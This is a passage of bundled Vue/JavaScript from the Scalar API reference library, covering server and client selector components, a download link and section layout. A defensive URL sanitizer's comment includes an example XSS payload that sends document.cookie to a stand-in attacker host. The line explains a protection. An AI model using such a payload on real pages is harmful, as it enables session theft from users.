			return serverOptions.value.length > 1 ? (openBlock(), createBlock(unref(ScalarListbox_default), {
				key: 0,
				ref: "elem",
				class: "group",
				modelValue: selectedServerOption.value,
				options: serverOptions.value,
				placement: "bottom-start",
				resize: "",
				target: __props.target,
				"onUpdate:modelValue": _cache[0] || (_cache[0] = (e) => emit("update:modelValue", e.id))
			}, {
				default: withCtx(() => [createVNode(unref(ScalarButton_default), {
					class: "bg-b-1 text-c-1 h-auto w-full justify-start gap-1.5 overflow-x-auto rounded-t-none !rounded-b-xl px-3 py-1.5 text-base/5.25 font-normal whitespace-nowrap -outline-offset-1",
					variant: "ghost"
				}, {
					default: withCtx(() => [
						createBaseVNode("span", _hoisted_1$97, toDisplayString(unref(translate)("server.label")) + ":", 1),
						createBaseVNode("span", _hoisted_2$60, toDisplayString(serverUrlWithoutTrailingSlash.value || unref(translate)("server.select")), 1),
						createVNode(unref(ScalarIconCaretDown_default), {
							class: "text-c-2 ui-open:rotate-180 mt-0.25 size-3 transition-transform duration-100",
							weight: "bold"
						})
					]),
					_: 1
				})]),
				_: 1
			}, 8, [
				"modelValue",
				"options",
				"target"
			])) : (openBlock(), createElementBlock("div", _hoisted_3$42, [createBaseVNode("span", _hoisted_4$27, toDisplayString(unref(translate)("server.label")) + ":", 1), createBaseVNode("span", _hoisted_5$18, toDisplayString(serverUrlWithoutTrailingSlash.value), 1)]));
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-asyncapi-server-selector-block/components/AsyncApiServerSelector.vue.script.js
var _hoisted_1$96 = { class: "bg-b-2 flex h-8 items-center rounded-t-xl border-x border-t px-3 py-2.5 font-medium" };
var _hoisted_2$59 = ["id"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-asyncapi-server-selector-block/components/AsyncApiServerSelector.vue.js
var AsyncApiServerSelector_default = /* @__PURE__ */ defineComponent({
	__name: "AsyncApiServerSelector",
	props: {
		eventBus: {},
		selectedServer: {},
		servers: {}
	},
	setup(__props) {
		const id = useId();
		const { translate } = useLocalization();
		/**
		* Normalize AsyncAPI server variables into the shape the shared
		* ServerVariablesForm expects (resolving references and defaulting `default`).
		*/
		const serverVariables = computed(() => {
			const variables = __props.selectedServer?.server.variables;
			if (!variables) return;
			return Object.fromEntries(Object.entries(variables).flatMap(([name, variable]) => {
				const resolved = getResolvedRef(variable);
				if (!resolved) return [];
				return [[name, {
					default: resolved.default ?? "",
					enum: resolved.enum,
					description: resolved.description
				}]];
			}));
		});
		/** Update the selected server */
		const updateServer = (name) => {
			__props.eventBus.emit("asyncapi-server:update:selected", { name });
		};
		/** Update a server variable on the selected server */
		const updateServerVariable = (key, value) => {
			if (!__props.selectedServer) return;
			__props.eventBus.emit("asyncapi-server:update:variables", {
				name: __props.selectedServer.name,
				key,
				value
			});
		};
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock(Fragment, null, [
				createBaseVNode("label", _hoisted_1$96, toDisplayString(unref(translate)("server.label")), 1),
				createBaseVNode("div", {
					id: unref(id),
					class: normalizeClass(["border", { "rounded-b-xl": !__props.selectedServer?.description && !serverVariables.value }])
				}, [__props.servers.length ? (openBlock(), createBlock(Selector_default$1, {
					key: 0,
					selectedServer: __props.selectedServer,
					servers: __props.servers,
					target: unref(id),
					"onUpdate:modelValue": updateServer
				}, null, 8, [
					"selectedServer",
					"servers",
					"target"
				])) : createCommentVNode("", true)], 10, _hoisted_2$59),
				createVNode(unref(ServerVariablesForm_default), {
					layout: "reference",
					variables: serverVariables.value,
					"onUpdate:variable": updateServerVariable
				}, null, 8, ["variables"]),
				__props.selectedServer?.description ? (openBlock(), createBlock(unref(ScalarMarkdown_default), {
					key: 0,
					class: "text-c-3 rounded-b-xl border-x border-b px-3 py-1.5",
					value: __props.selectedServer.description
				}, null, 8, ["value"])) : createCommentVNode("", true)
			], 64);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-client-selector-block/helpers/featured-clients.js
/** Hard coded list of default featured clients */
var FEATURED_CLIENTS = [
	"shell/curl",
	"ruby/native",
	"node/undici",
	"php/guzzle",
	"python/python3"
];
/** Whether or not a client is in the featured list */
var isFeaturedClient = (clientId, featuredClients = FEATURED_CLIENTS) => Boolean(clientId && featuredClients.includes(clientId));
/**
* Maps featured client IDs to their corresponding ClientOption objects.
* Returns an array of ClientOption objects that match the featured clients list,
* maintaining the order of the featured clients.
*/
var getFeaturedClients = (clientOptions, featuredClients = FEATURED_CLIENTS) => {
	const clientMap = /* @__PURE__ */ new Map();
	for (const group of clientOptions) for (const option of group.options) clientMap.set(option.id, option);
	return featuredClients.flatMap((clientId) => {
		return clientMap.get(clientId) ?? [];
	});
};
//#endregion
//#region node_modules/@scalar/workspace-store/dist/helpers/get-first-server.js
/**
* Iterate through all available servers and pick the first one
*
* @example
* getFirstServer(operation.servers, pathItem.servers, document.servers)
*/
var getFirstServer = (...availableServers) => {
	for (const serverSource of availableServers) {
		if (!serverSource) continue;
		if (!Array.isArray(serverSource)) {
			const resolvedServer = getResolvedRef(serverSource);
			if (resolvedServer?.url) return resolvedServer;
			continue;
		}
		for (const server of serverSource) {
			const resolvedServer = getResolvedRef(server);
			if (resolvedServer?.url) return resolvedServer;
		}
	}
	return null;
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-client-selector-block/components/ClientDropdown.vue.script.js
var _hoisted_1$95 = {
	"aria-hidden": "true",
	class: "client-libraries-icon__more"
};
var _hoisted_2$58 = {
	key: 1,
	class: "client-libraries-icon",
	height: "50",
	role: "presentation",
	viewBox: "0 0 50 50",
	width: "50",
	xmlns: "http://www.w3.org/2000/svg"
};
var _hoisted_3$41 = {
	key: 0,
	class: "client-libraries-text client-libraries-text-more"
};
var _hoisted_4$26 = { class: "sr-only" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-client-selector-block/components/ClientDropdown.vue.js
var ClientDropdown_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "ClientDropdown",
	props: {
		clientOptions: {},
		selectedClient: {},
		eventBus: {}
	},
	setup(__props) {
		const containerRef = ref();
		const { translate } = useLocalization();
		/**
		* Icons have longer names to appear in icon searches, e.g. "javascript-js" instead of just "javascript". This function
		* maps the language key to the icon name.
		*/
		const getIconByLanguageKey = (targetKey) => `programming-language-${targetKey === "js" ? "javascript" : targetKey}`;
		/** Set custom example, or update the selected HTTP client globally */
		const selectClient = (option) => {
			if (!containerRef.value) return;
			const unfreeze = freezeElement(containerRef.value);
			setTimeout(() => {
				unfreeze();
			}, 300);
			if (option.clientKey !== "custom") __props.eventBus.emit("workspace:update:selected-client", option.id);
		};
		/** Calculates the targetKey from the selected client id */
		const selectedTargetKey = computed(() => __props.selectedClient?.split("/")[0]);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", {
				ref_key: "containerRef",
				ref: containerRef,
				class: "client-libraries-more"
			}, [createVNode(unref(ScalarCombobox_default), {
				filterFn: unref(n),
				modelValue: unref(i$2)(__props.clientOptions, __props.selectedClient),
				options: __props.clientOptions,
				placement: "bottom-end",
				teleport: "",
				"onUpdate:modelValue": _cache[0] || (_cache[0] = ($event) => selectClient($event))
			}, {
				default: withCtx(() => [createBaseVNode("button", {
					class: normalizeClass(["client-libraries client-libraries__select", { "client-libraries__active": __props.selectedClient && !unref(isFeaturedClient)(__props.selectedClient) }]),
					type: "button"
				}, [
					createBaseVNode("div", _hoisted_1$95, [__props.selectedClient && !unref(isFeaturedClient)(__props.selectedClient) ? (openBlock(), createElementBlock("div", {
						key: 0,
						class: normalizeClass(`client-libraries-icon__${selectedTargetKey.value}`)
					}, [selectedTargetKey.value ? (openBlock(), createBlock(unref(ScalarIcon_default), {
						key: 0,
						class: "client-libraries-icon",
						icon: getIconByLanguageKey(selectedTargetKey.value)
					}, null, 8, ["icon"])) : createCommentVNode("", true)], 2)) : (openBlock(), createElementBlock("svg", _hoisted_2$58, [..._cache[1] || (_cache[1] = [createBaseVNode("g", {
						fill: "currentColor",
						"fill-rule": "nonzero"
					}, [createBaseVNode("path", { d: "M10.71 25.3a3.87 3.87 0 1 0 7.74 0 3.87 3.87 0 0 0-7.74 0M21.13 25.3a3.87 3.87 0 1 0 7.74 0 3.87 3.87 0 0 0-7.74 0M31.55 25.3a3.87 3.87 0 1 0 7.74 0 3.87 3.87 0 0 0-7.74 0" })], -1)])]))]),
					__props.clientOptions.length ? (openBlock(), createElementBlock("span", _hoisted_3$41, toDisplayString(unref(translate)("clientLibraries.more")), 1)) : createCommentVNode("", true),
					createBaseVNode("span", _hoisted_4$26, toDisplayString(unref(translate)("clientLibraries.selectAll")), 1)
				], 2)]),
				_: 1
			}, 8, [
				"filterFn",
				"modelValue",
				"options"
			])], 512);
		};
	}
}), [["__scopeId", "data-v-da3e3bd2"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-client-selector-block/components/ClientSelector.vue.script.js
var _hoisted_1$94 = {
	key: 0,
	ref: "wrapper-ref"
};
var _hoisted_2$57 = ["id"];
var _hoisted_3$40 = { class: "client-libraries-list" };
var _hoisted_4$25 = { class: "client-libraries-text" };
var _hoisted_5$17 = ["id"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-client-selector-block/components/ClientSelector.vue.js
var ClientSelector_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "ClientSelector",
	props: {
		clientOptions: {},
		selectedClient: { default: () => t$1 },
		eventBus: {}
	},
	setup(__props, { expose: __expose }) {
		const headingId = useId();
		const morePanel = useId();
		const { translate } = useLocalization();
		/**
		* Whether a selection is a custom code sample (e.g. `custom/python`) rather than
		* a built-in client. Custom samples are matched by the `custom/` id prefix, which
		* mirrors the `^custom/` pattern enforced on the stored default client.
		*/
		const isCustomSelection = (client) => Boolean(client?.startsWith("custom/"));
		/**
		* The generic client this selector actually displays.
		*
		* The introduction selector only represents the built-in HTTP clients. Custom
		* code samples are operation-specific and "always just have the generic
		* clients", so when one is selected globally we keep showing the last generic
		* client here instead of switching to (and failing to render) a custom sample.
		*/
		const activeClient = ref(isCustomSelection(__props.selectedClient) ? t$1 : __props.selectedClient);
		watch(() => __props.selectedClient, (newClient) => {
			if (!isCustomSelection(newClient)) activeClient.value = newClient;
		});
		/** Grab the option for the currently selected Http Client */
		const selectedClientOption = computed(() => __props.clientOptions.flatMap((optionGroup) => optionGroup.options.find((option) => option.id === activeClient.value) ?? [])[0]);
		/** List of featured clients */
		const featuredClients = computed(() => getFeaturedClients(__props.clientOptions));
		/** Currently selected tab index */
		const tabIndex = computed(() => featuredClients.value.findIndex((client) => client.id === activeClient.value));
		const wrapper = useTemplateRef("wrapper-ref");
		const getIconByLanguageKey = (targetKey) => `programming-language-${targetKey === "js" ? "javascript" : targetKey}`;
		/** Handle tab selection */
		const onTabSelect = (index) => {
			const client = featuredClients.value[index];
			if (!client || !wrapper.value) return;
			__props.eventBus.emit("workspace:update:selected-client", client.id);
		};
		__expose({ selectedClientOption });
		return (_ctx, _cache) => {
			return __props.clientOptions.length ? (openBlock(), createElementBlock("div", _hoisted_1$94, [createVNode(unref(me), {
				manual: "",
				selectedIndex: tabIndex.value,
				onChange: onTabSelect
			}, {
				default: withCtx(() => [
					createBaseVNode("div", {
						id: unref(headingId),
						class: "client-libraries-heading"
					}, toDisplayString(unref(translate)("clientLibraries.heading")), 9, _hoisted_2$57),
					createBaseVNode("div", _hoisted_3$40, [createVNode(unref(pe), {
						"aria-labelledby": unref(headingId),
						class: "client-libraries-tabs",
						style: normalizeStyle({ flexGrow: featuredClients.value.length })
					}, {
						default: withCtx(() => [(openBlock(true), createElementBlock(Fragment, null, renderList(featuredClients.value, (featuredClient) => {
							return openBlock(), createBlock(unref(xe), {
								key: featuredClient.clientKey,
								class: normalizeClass(["client-libraries rendered-code-sdks", { "client-libraries__active": featuredClient.id === activeClient.value }])
							}, {
								default: withCtx(() => [createBaseVNode("div", { class: normalizeClass(`client-libraries-icon__${featuredClient.targetKey}`) }, [createVNode(unref(ScalarIcon_default), {
									class: "client-libraries-icon",
									icon: getIconByLanguageKey(featuredClient.targetKey)
								}, null, 8, ["icon"])], 2), createBaseVNode("span", _hoisted_4$25, toDisplayString(featuredClient.targetTitle), 1)]),
								_: 2
							}, 1032, ["class"]);
						}), 128))]),
						_: 1
					}, 8, ["aria-labelledby", "style"]), createVNode(ClientDropdown_default, {
						clientOptions: __props.clientOptions,
						eventBus: __props.eventBus,
						selectedClient: activeClient.value
					}, null, 8, [
						"clientOptions",
						"eventBus",
						"selectedClient"
					])]),
					createVNode(unref(Ie), null, {
						default: withCtx(() => [unref(isFeaturedClient)(activeClient.value) ? (openBlock(true), createElementBlock(Fragment, { key: 0 }, renderList(featuredClients.value, (client) => {
							return openBlock(), createBlock(unref(ye), {
								key: client.id,
								class: "selected-client card-footer -outline-offset-2"
							}, {
								default: withCtx(() => [createTextVNode(toDisplayString(client.title), 1)]),
								_: 2
							}, 1024);
						}), 128)) : (openBlock(), createElementBlock("div", {
							key: 1,
							id: unref(morePanel),
							class: "selected-client card-footer -outline-offset-2",
							role: "tabpanel",
							tabindex: "0"
						}, toDisplayString(selectedClientOption.value?.title), 9, _hoisted_5$17))]),
						_: 1
					})
				]),
				_: 1
			}, 8, ["selectedIndex"])], 512)) : createCommentVNode("", true);
		};
	}
}), [["__scopeId", "data-v-34beffcc"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/document-outline/use-document-outline.js
/**
* The outline of a full reference, and the only place levels are written down.
*
* Each role appears exactly once: a role has one place in the hierarchy, so
* roles that sit alongside each other share a level.
*/
var OUTLINE = {
	document: 1,
	tag: 2,
	channel: 2,
	modelGroup: 2,
	operation: 3,
	model: 3,
	message: 4,
	/** A titled group inside an operation: Body, Responses, Query Parameters */
	operationSection: 4
};
/** The role at the top of the current page. */
var OUTLINE_ROOT = Symbol("DOCUMENT_OUTLINE_ROOT");
var clamp = (level) => Math.min(6, Math.max(1, level));
/**
* Declare the role at the top of this page.
*
* Called by a component that renders two or more blocks alongside each other
* and therefore owns the relationship between them — `Content` renders the
* info block above the tags and operations, so it anchors the outline at
* `document` and everything below resolves against that.
*
* A block rendered on its own needs no call: it anchors itself.
*/
var provideDocumentOutline = (role) => provide(OUTLINE_ROOT, role);
/**
* The heading level for a block's own heading.
*
* A block assumes it is the top of the page — rendered on its own it is the
* `h1`, and the blocks it contains follow beneath it. Rendering it inside a
* composed outline overrides that, so the same component is an `h3` in a full
* reference and an `h1` on a page that shows only that operation.
*/
var useDocumentOutline = (role) => {
	const inherited = inject(OUTLINE_ROOT, null);
	if (!inherited) provide(OUTLINE_ROOT, role);
	const root = inherited ?? role;
	return { level: clamp(OUTLINE[role] - OUTLINE[root] + 1) };
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/specification-extension/helpers.js
/**
* Utility function to extract all keys starting with 'x-' (OpenAPI extensions) from an object.
*
* @param object - The object from which to extract extension keys.
* @returns An object containing only the entries whose keys start with 'x-'.
*/
var getXKeysFromObject = (object) => {
	if (!object) return {};
	return Object.fromEntries(Object.entries(object).filter(([key]) => key.startsWith("x-")));
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Badge/Badge.vue.js
var Badge_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	inheritAttrs: false,
	__name: "Badge",
	props: { color: {} },
	setup(__props) {
		const { cx } = useBindCx();
		const badgeStyle = computed(() => __props.color ? { "--badge-color": __props.color } : void 0);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", mergeProps(unref(cx)("badge inline-block rounded-2xl border bg-b-2 px-1.5 py-0.5 text-c-2 text-sm", { "badge-colored": Boolean(__props.color) }), { style: badgeStyle.value }), [renderSlot(_ctx.$slots, "default", {}, void 0, true)], 16);
		};
	}
}), [["__scopeId", "data-v-28a4f026"]]);
//#endregion
//#region node_modules/@scalar/helpers/dist/url/is-safe-url.js
/**
* Protocols that are safe to put into an `href` or `src` attribute.
*
* Everything else — most importantly `javascript:`, but also `data:`, `blob:` and `vbscript:` —
* can execute script in the context of the page that renders the link.
*/
var SAFE_PROTOCOLS = /* @__PURE__ */ new Set([
	"http:",
	"https:",
	"mailto:",
	"tel:",
	"ftp:",
	"ftps:",
	"sms:"
]);
/**
* Matches a leading URL scheme, for example `https:` in `https://example.com`.
*
* A URL without a scheme is relative (`/docs`, `./openapi.json`, `#section`, `//example.com`) and
* therefore resolves against the current origin, so it cannot carry a dangerous protocol.
*/
var SCHEME_REGEX = /^([a-z][a-z0-9+.-]*):/i;
/**
* ASCII whitespace, C0 controls, DEL and C1 controls.
*
* Browsers strip these before they resolve a URL, which means `java\tscript:alert(1)` still
* executes. Remove them first, otherwise the protocol check below is trivial to bypass.
*/
var IGNORED_CHARACTERS_REGEX = /[\u0000-\u0020\u007f-\u009f]/g;
/**
* Checks whether a URL is safe to render as a link target.
*
* Values that end up in an `href` frequently come from an OpenAPI document, and an OpenAPI document
* is untrusted input. A document that sets `info.license.url` to
* `javascript:fetch('https://evil.example/?c=' + document.cookie)` would otherwise render a link
* that runs script in the context of the documentation page.
*
* @example
* isSafeUrl('https://example.com') // true
* isSafeUrl('/openapi.json') // true (relative)
* isSafeUrl('javascript:alert(1)') // false
*/
var isSafeUrl = (url) => {
	if (!url) return false;
	const normalized = url.replace(IGNORED_CHARACTERS_REGEX, "");
	if (!normalized) return false;
	const scheme = SCHEME_REGEX.exec(normalized)?.[1];
	if (!scheme) return true;
	return SAFE_PROTOCOLS.has(`${scheme.toLowerCase()}:`);
};
/**
* Returns the URL when it is safe to render as a link target, and `undefined` otherwise.
*
* Use this to drop the `href` (and ideally the whole link) instead of rendering an attacker
* controlled protocol.
*
* @example
* sanitizeUrl('https://example.com') // 'https://example.com'
* sanitizeUrl('javascript:alert(1)') // undefined
*/
var sanitizeUrl = (url) => isSafeUrl(url) ? url : void 0;
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-info-block/components/DownloadLink.vue.script.js
var _hoisted_1$93 = ["href"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-info-block/components/DownloadLink.vue.js
var DownloadLink_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "DownloadLink",
	props: {
		documentDownloadType: {},
		eventBus: {},
		documentUrl: {},
		documentType: { default: "openapi" }
	},
	setup(__props) {
		const { translate } = useLocalization();
		const label = computed(() => __props.documentType === "asyncapi" ? translate("download.asyncapi") : translate("download.openapi"));
		/**
		* The document URL can be supplied by whoever controls the rendered document, so a protocol like
		* `javascript:` would execute script on click. Drop the direct link in that case.
		*/
		const safeDocumentUrl = computed(() => sanitizeUrl(__props.documentUrl));
		const handleDownloadClick = (format) => {
			__props.eventBus.emit("ui:download:document", { format });
		};
		return (_ctx, _cache) => {
			return [
				"yaml",
				"json",
				"both"
			].includes(__props.documentDownloadType) || __props.documentDownloadType === "direct" && safeDocumentUrl.value ? (openBlock(), createElementBlock("div", {
				key: 0,
				class: normalizeClass(["download-container group", { "download-both": __props.documentDownloadType === "both" }])
			}, [
				__props.documentDownloadType === "direct" && safeDocumentUrl.value ? (openBlock(), createElementBlock("a", {
					key: 0,
					class: "download-link download-button",
					href: safeDocumentUrl.value
				}, [createBaseVNode("span", null, toDisplayString(label.value), 1)], 8, _hoisted_1$93)) : createCommentVNode("", true),
				__props.documentDownloadType === "json" || __props.documentDownloadType === "both" ? (openBlock(), createElementBlock("button", {
					key: 1,
					class: "download-button",
					type: "button",
					onClick: _cache[0] || (_cache[0] = withModifiers(() => handleDownloadClick("json"), ["prevent"]))
				}, [createBaseVNode("span", null, toDisplayString(label.value), 1), createVNode(Badge_default, { class: "extension hidden group-hover:flex" }, {
					default: withCtx(() => [..._cache[2] || (_cache[2] = [createTextVNode("json", -1)])]),
					_: 1
				})])) : createCommentVNode("", true),
				__props.documentDownloadType === "yaml" || __props.documentDownloadType === "both" ? (openBlock(), createElementBlock("button", {
					key: 2,
					class: "download-button",
					type: "button",
					onClick: _cache[1] || (_cache[1] = withModifiers(() => handleDownloadClick("yaml"), ["prevent"]))
				}, [createBaseVNode("span", null, toDisplayString(label.value), 1), createVNode(Badge_default, { class: "extension hidden group-hover:flex" }, {
					default: withCtx(() => [..._cache[3] || (_cache[3] = [createTextVNode("yaml", -1)])]),
					_: 1
				})])) : createCommentVNode("", true)
			], 2)) : createCommentVNode("", true);
		};
	}
}), [["__scopeId", "data-v-0aba6db2"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-info-block/components/IntroductionCard.vue.js
var IntroductionCard_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "IntroductionCard",
	props: { row: { type: Boolean } },
	setup(__props) {
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", { class: normalizeClass(["introduction-card", { "introduction-card-row": __props.row }]) }, [renderSlot(_ctx.$slots, "default", {}, void 0, true)], 2);
		};
	}
}), [["__scopeId", "data-v-e60166e1"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Section/Section.vue.js
var Section_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "Section",
	emits: ["intersecting"],
	setup(__props, { emit: __emit }) {
		const emit = __emit;
		const section = useTemplateRef("section");
		useIntersection(section, () => emit("intersecting"));
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("section", {
				ref_key: "section",
				ref: section,
				class: "section"
			}, [renderSlot(_ctx.$slots, "default", {}, void 0, true)], 512);
		};
	}
}), [["__scopeId", "data-v-be4443e9"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Section/SectionColumn.vue.js
var _sfc_main$6 = {};
var _hoisted_1$92 = { class: "section-column" };
function _sfc_render$7(_ctx, _cache) {
	return openBlock(), createElementBlock("div", _hoisted_1$92, [renderSlot(_ctx.$slots, "default", {}, void 0, true)]);
}
var SectionColumn_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(_sfc_main$6, [["render", _sfc_render$7], ["__scopeId", "data-v-699c28e3"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Section/SectionColumns.vue.js
var _sfc_main$5 = {};
var _hoisted_1$91 = { class: "section-columns" };
function _sfc_render$6(_ctx, _cache) {
	return openBlock(), createElementBlock("div", _hoisted_1$91, [renderSlot(_ctx.$slots, "default", {}, void 0, true)]);
}
var SectionColumns_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(_sfc_main$5, [["render", _sfc_render$6], ["__scopeId", "data-v-8b9602bf"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Section/SectionContainer.vue.script.js
var _hoisted_1$90 = {
	key: 1,
	class: "section-container"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Section/SectionContainer.vue.js
var SectionContainer_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "SectionContainer",
	props: { omit: { type: Boolean } },
	setup(__props) {
		return (_ctx, _cache) => {
			return __props.omit ? renderSlot(_ctx.$slots, "default", {}, void 0, true, 0) : (openBlock(), createElementBlock("div", _hoisted_1$90, [renderSlot(_ctx.$slots, "default", {}, void 0, true)]));
		};
	}
}), [["__scopeId", "data-v-20a1472a"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Section/SectionContent.vue.js
var _sfc_main$4 = {};
var _hoisted_1$89 = { class: "section-content" };
function _sfc_render$5(_ctx, _cache) {
	return openBlock(), createElementBlock("div", _hoisted_1$89, [renderSlot(_ctx.$slots, "default", {}, void 0, true)]);
}
var SectionContent_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(_sfc_main$4, [["render", _sfc_render$5], ["__scopeId", "data-v-6101128d"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Section/SectionHeader.vue.script.js
var _hoisted_1$88 = { class: "section-header-wrapper narrow:grid-cols-1 narrow:gap-0 grid grid-cols-2 gap-12" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Section/SectionHeader.vue.js
var SectionHeader_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "SectionHeader",
	props: {
		tight: { type: Boolean },
		removeMargin: {
			type: Boolean,
			default: false
		}
	},
	setup(__props) {
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", _hoisted_1$88, [createBaseVNode("div", { class: normalizeClass(["section-header", {
				tight: __props.tight,
				"mb-3": !__props.removeMargin
			}]) }, [renderSlot(_ctx.$slots, "default", {}, void 0, true)], 2), _ctx.$slots.links ? renderSlot(_ctx.$slots, "links", {}, void 0, true, 0) : createCommentVNode("", true)]);
		};
	}
}), [["__scopeId", "data-v-7607c44e"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Section/SectionHeaderTag.vue.js
var SectionHeaderTag_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "SectionHeaderTag",
	props: {
		level: { default: 1 },
		rule: {
			type: Boolean,
			default: false
		}
	},
	setup(__props) {
		return (_ctx, _cache) => {
			return openBlock(), createBlock(resolveDynamicComponent(`h${__props.level}`), { class: normalizeClass(["section-header-label", { "section-header-label--rule block! border-b pb-3": __props.rule }]) }, {
				default: withCtx(() => [renderSlot(_ctx.$slots, "default", {}, void 0, true)]),
				_: 3
			}, 8, ["class"]);
		};
	}
}), [["__scopeId", "data-v-9a218f12"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/specification-extension/SpecificationExtension.vue.script.js
var _hoisted_1$87 = {
	key: 0,
	class: "text-base"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/specification-extension/SpecificationExtension.vue.js
var SpecificationExtension_default = /* @__PURE__ */ defineComponent({
	__name: "SpecificationExtension",
	props: { value: {} },
	setup(__props) {
		const { getSpecificationExtensions } = usePluginManager();
		/**
		* Extract registered OpenAPI extension names
		*/
		function getCustomExtensionNames(value) {
			return Object.keys(value ?? {}).filter((item) => item.startsWith("x-"));
		}
		/**
		* Get the components for the specification extensions
		*/
		function getCustomOpenApiExtensionComponents(extensionNames) {
			return extensionNames.flatMap((name) => getSpecificationExtensions(name)).filter((extension) => extension.component);
		}
		/**
		* Get the names of custom extensions from the provided value.
		*/
		const customExtensionNames = computed(() => getCustomExtensionNames(__props.value));
		/**
		* Get the components for the custom extensions.
		*/
		const customExtensions = computed(() => getCustomOpenApiExtensionComponents(customExtensionNames.value));
		return (_ctx, _cache) => {
			return typeof __props.value === "object" && customExtensions.value.length ? (openBlock(), createElementBlock("div", _hoisted_1$87, [(openBlock(true), createElementBlock(Fragment, null, renderList(customExtensions.value, (extension) => {
				return openBlock(), createBlock(unref(ScalarErrorBoundary_default), null, {
					default: withCtx(() => [extension.renderer ? (openBlock(), createBlock(resolveDynamicComponent(extension.renderer), mergeProps({
						key: 0,
						ref_for: true
					}, {
						[extension.name]: __props.value?.[extension.name],
						component: extension.component
					}), null, 16)) : (openBlock(), createBlock(resolveDynamicComponent(extension.component), mergeProps({
						key: 1,
						ref_for: true
					}, { [extension.name]: __props.value?.[extension.name] }), null, 16))]),
					_: 2
				}, 1024);
			}), 256))])) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-info-block/components/InfoMarkdownSection.vue.script.js
var _hoisted_1$86 = ["id"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-info-block/components/InfoMarkdownSection.vue.js
var InfoMarkdownSection_default = /* @__PURE__ */ defineComponent({
	__name: "InfoMarkdownSection",
	props: {
		id: {},
		content: {},
		transformHeading: { type: Function },
		eventBus: {}
	},
	setup(__props) {
		const element = useTemplateRef("element");
		useIntersection(element, () => __props.id ? __props.eventBus?.emit("intersecting:nav-item", { id: __props.id }) : void 0);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", {
				id: __props.id,
				ref_key: "element",
				ref: element,
				class: "introduction-description-heading scroll-mt-16"
			}, [createVNode(unref(ScalarMarkdown_default), {
				transform: __props.transformHeading,
				transformType: "heading",
				value: __props.content,
				withImages: ""
			}, null, 8, ["transform", "value"])], 8, _hoisted_1$86);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-info-block/components/InfoDescription.vue.script.js
var _hoisted_1$85 = {
	key: 0,
	class: "introduction-description mt-6 flex flex-col"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-info-block/components/InfoDescription.vue.js
var InfoDescription_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "InfoDescription",
	props: {
		eventBus: {},
		headingSlugGenerator: { type: Function },
		description: {}
	},
	setup(__props) {
		/**
		* Descriptions, but split into multiple sections.
		* We need this to wrap the headings in IntersectionObserver components.
		*/
		const sections = computed(() => {
			if (!__props.description) return [];
			const { slug } = slugger();
			return splitContent(__props.description).map((markdown) => {
				const heading = getHeadings(markdown)[0];
				return {
					id: heading ? __props.headingSlugGenerator({
						...heading,
						slug: slug(heading.value)
					}) : void 0,
					content: markdown
				};
			});
		});
		/** Add ids to all headings */
		const transformHeading = (node) => {
			if (!isHeading(node)) return node;
			const { slug } = slugger();
			const value = textFromNode(node);
			node.data = { hProperties: { id: __props.headingSlugGenerator({
				depth: node.depth,
				value,
				slug: slug(value)
			}) } };
			return node;
		};
		return (_ctx, _cache) => {
